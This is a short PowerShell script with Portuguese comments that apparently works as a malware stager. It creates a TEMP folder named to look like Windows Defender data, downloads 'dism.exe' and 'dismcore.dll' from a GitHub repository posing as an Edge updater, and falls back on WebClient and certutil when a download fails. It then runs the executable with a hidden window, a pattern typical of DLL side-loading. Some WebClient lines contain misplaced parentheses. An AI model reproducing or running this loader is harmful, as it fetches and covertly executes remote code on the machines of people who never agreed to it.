$d=$env:TEMP+'\WinDefData'
if(!(Test-Path $d)){New-Item $d -Force|Out-Null}
$u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/'
$ok=$false
# Método 1: Invoke-WebRequest
try{
    Invoke-WebRequest -Uri ($u+'dismcore.dll') -OutFile "$d\dismcore.dll" -UseBasicParsing -ErrorAction Stop
    Invoke-WebRequest -Uri ($u+'dism.exe') -OutFile "$d\dism.exe" -UseBasicParsing -ErrorAction Stop
    $ok=$true
}catch{}
# Método 2: WebClient
if(-not $ok){
    try{
        (New-Object Net.WebClient).DownloadFile($u+'dismcore.dll'),"$d\dismcore.dll")
        (New-Object Net.WebClient).DownloadFile($u+'dism.exe'),"$d\dism.exe")
        $ok=$true
    }catch{}
}
# Método 3: certutil (via cmd)
if(-not $ok){
    cmd /c "certutil -urlcache -split -f $($u)dismcore.dll `"$d\dismcore.dll`"" 2>$null
    cmd /c "certutil -urlcache -split -f $($u)dism.exe `"$d\dism.exe`"" 2>$null
    if((Test-Path "$d\dismcore.dll") -and (Get-Item "$d\dismcore.dll").Length -gt 1000){$ok=$true}
}
if($ok){
    Write-Host "Download OK"
    Start-Process "$d\dism.exe" -WindowStyle Hidden
    Write-Host "Executado"
}else{
    Write-Host "ERRO: Todos os métodos de download falharam"
    Write-Host "Verifique: firewall, proxy, acesso a internet"
}
